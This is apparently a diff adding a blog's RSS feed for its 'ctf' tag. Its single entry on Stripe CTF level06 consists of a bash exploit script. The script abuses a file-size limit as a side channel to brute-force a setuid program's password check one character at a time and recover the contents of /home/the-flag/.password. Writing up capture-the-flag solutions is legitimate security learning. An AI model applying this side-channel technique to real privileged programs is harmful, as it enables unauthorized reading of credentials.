@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ctf on warrick.io</title>
+    <link>//warrick.io/tags/ctf/</link>
+    <description>Recent content in Ctf on warrick.io</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 29 Feb 2012 10:05:46 +0000</lastBuildDate>
+    
+	<atom:link href="//warrick.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>level06 stripe ctf</title>
+      <link>//warrick.io/posts/level06-stripe-ctf/</link>
+      <pubDate>Wed, 29 Feb 2012 10:05:46 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/level06-stripe-ctf/</guid>
+      <description>#!/usr/bin/env bash  ulimit -f 1 # set file size limit to 1024 bytes  s=&amp;#34;&amp;#34; while true; do for ((i=32; i &amp;lt; 127; i++)); do rm f o c=$(ruby -e &amp;#34;print ${i}.chr&amp;#34;) t=&amp;#34;${s}${c}...&amp;#34; echo &amp;#34;${t}&amp;#34; ruby -e &amp;#34;print &amp;#39;A&amp;#39; * (1024-33-${#t}+3)&amp;#34; &amp;gt; f; /levels/level06 /home/the-flag/.password &amp;#34;${t}&amp;#34; 2&amp;gt;&amp;gt;f 1&amp;gt;o; sleep 0.1 # INCREASE LIBERALLY IF FALSE POSITIVES  if [ ! -s o ]; then # if file o is empty  s=&amp;#34;${s}${c}&amp;#34; echo -n $c break fi done done</description>
+    </item>
+    
+  </channel>
+</rss>
